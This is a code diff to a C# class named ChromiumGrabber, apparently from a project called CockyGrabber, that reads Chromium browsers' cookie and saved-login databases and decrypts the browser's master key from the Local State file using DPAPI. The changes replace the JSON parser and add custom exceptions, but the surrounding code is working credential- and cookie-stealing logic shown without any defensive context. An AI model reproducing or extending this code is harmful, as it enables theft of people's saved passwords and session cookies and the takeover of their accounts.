@@ -1,4 +1,4 @@
-﻿using Newtonsoft.Json.Linq;
+﻿using CockyGrabber.Utility;
 using Org.BouncyCastle.Crypto;
 using Org.BouncyCastle.Crypto.Engines;
 using Org.BouncyCastle.Crypto.Modes;
@@ -9,6 +9,7 @@ using System.IO;
 using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
+using System.Web.Script.Serialization;
 
 namespace CockyGrabber.Grabbers
 {
@@ -19,6 +20,12 @@ namespace CockyGrabber.Grabbers
         public virtual string ChromiumBrowserCookiePath { get; set; }
         public virtual string ChromiumBrowserLocalStatePath { get; set; }
         public virtual string ChromiumBrowserLoginDataPath { get; set; }
+
+        private readonly JavaScriptSerializer JSON_Serializer = new JavaScriptSerializer();
+        public ChromiumGrabber()
+        {
+            JSON_Serializer.RegisterConverters(new[] { new DynamicJsonConverter() });  // Register DynamicJsonConverter for dynamic JSON (De)Serialisation
+        }
 
         #region IO Functions
         /// <summary>
@@ -49,7 +56,7 @@ namespace CockyGrabber.Grabbers
         {
             List<Chromium.Cookie> cookies = new List<Chromium.Cookie>();
             if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
-            if (!CookiesExist()) throw new FileNotFoundException($"Program can't find \"{ChromiumBrowserCookiePath}\"", ChromiumBrowserCookiePath); // throw a FileNotFoundException if the Cookie DB was not found
+            if (!CookiesExist()) throw new CookieDatabaseNotFoundException(ChromiumBrowserCookiePath); // throw a CookieDatabaseNotFoundException if the Cookie DB was not found
 
             // Copy the database to a temporary location because it could be already in use
             string tempFile = GetTempFileName();
@@ -100,8 +107,8 @@ namespace CockyGrabber.Grabbers
         public IEnumerable<Chromium.Cookie> GetCookies(byte[] key)
         {
             List<Chromium.Cookie> cookies = new List<Chromium.Cookie>();
-            if (!CookiesExist()) throw new FileNotFoundException($"Program can't find \"{ChromiumBrowserCookiePath}\"", ChromiumBrowserCookiePath); // throw a FileNotFoundException if the Cookie DB was not found
-            
+            if (!CookiesExist()) throw new CookieDatabaseNotFoundException(ChromiumBrowserCookiePath); // throw a CookieDatabaseNotFoundException if the Cookie DB was not found
+
             // Copy the database to a temporary location because it could be already in use
             string tempFile = GetTempFileName();
             File.Copy(ChromiumBrowserCookiePath, tempFile);
@@ -154,7 +161,7 @@ namespace CockyGrabber.Grabbers
         {
             List<Chromium.Login> password = new List<Chromium.Login>();
             if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
-            if (!LoginsExist()) throw new FileNotFoundException($"Program can't find \"{ChromiumBrowserLoginDataPath}\"", ChromiumBrowserLoginDataPath); // throw a FileNotFoundException if the Login DB was not found
+            if (!LoginsExist()) throw new LoginDatabaseNotFoundException(ChromiumBrowserLoginDataPath); // throw a LoginDatabaseNotFoundException if the Login DB was not found
 
             // Copy the database to a temporary location because it could be already in use
             string tempFile = GetTempFileName();
@@ -211,7 +218,7 @@ namespace CockyGrabber.Grabbers
         public IEnumerable<Chromium.Login> GetLogins(byte[] key)
         {
             List<Chromium.Login> password = new List<Chromium.Login>();
-            if (!LoginsExist()) throw new FileNotFoundException($"Program can't find \"{ChromiumBrowserLoginDataPath}\"", ChromiumBrowserLoginDataPath); // throw a FileNotFoundException if the Login DB was not found
+            if (!LoginsExist()) throw new LoginDatabaseNotFoundException(ChromiumBrowserLoginDataPath); // throw a LoginDatabaseNotFoundException if the Login DB was not found
 
             // Copy the database to a temporary location because it could be already in use
             string tempFile = GetTempFileName();
@@ -270,9 +277,14 @@ namespace CockyGrabber.Grabbers
         /// </summary>
         public byte[] GetKey()
         {
-            string encKey = File.ReadAllText(ChromiumBrowserLocalStatePath); // Read file
-            encKey = JObject.Parse(encKey)["os_crypt"]["encrypted_key"].ToString(); // Get Encrypted key
-            return ProtectedData.Unprotect(Convert.FromBase64String(encKey).Skip(5).ToArray(), null, DataProtectionScope.LocalMachine); // Decrypt the encrypted key and return a byte Array
+            if (!KeyExists()) throw new LocalStateNotFoundException(ChromiumBrowserLocalStatePath); // throw a LocalStateNotFoundException if the "Local State" file that stores the key for decryption was not found
+
+            string fileText = File.ReadAllText(ChromiumBrowserLocalStatePath); // Read file
+
+            dynamic dobj = JSON_Serializer.Deserialize(fileText, typeof(object)); // Deserialize fileText
+            string encKey = dobj.os_crypt.encrypted_key; // this is the encrypted key as a string
+
+            return ProtectedData.Unprotect(Convert.FromBase64String(encKey).Skip(5).ToArray(), null, DataProtectionScope.LocalMachine); // Decrypt the encrypted key through unprotection and return a byte Array
         }
 
         // undocumented;
